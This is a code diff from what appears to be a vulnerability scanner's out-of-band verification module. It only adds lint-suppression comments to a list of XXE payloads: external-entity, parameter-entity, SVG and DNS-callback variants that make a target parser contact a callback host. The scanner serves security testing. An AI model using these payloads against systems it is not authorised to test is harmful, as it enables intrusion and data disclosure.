@@ -146,17 +146,17 @@ class OOBIntegratedVerifier:
         # XXE OOB payloads
         payloads = [
             # 外部 DTD
-            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>',
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><foo>&xxe;</foo>',  # noqa: E501
             # Parameter entity
-            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]><foo></foo>',
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}"> %xxe;]><foo></foo>',  # noqa: E501
             # SVG XXE
-            f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback_url}">]><svg>&xxe;</svg>',
+            f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback_url}">]><svg>&xxe;</svg>',  # noqa: E501
         ]
 
         if self.dns_server:
             dns_domain, _ = self.generate_dns_payload("XXE", url, param)
             payloads.append(
-                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_domain}/">]><foo>&xxe;</foo>'
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_domain}/">]><foo>&xxe;</foo>'  # noqa: E501
             )
 
         # 发送请求
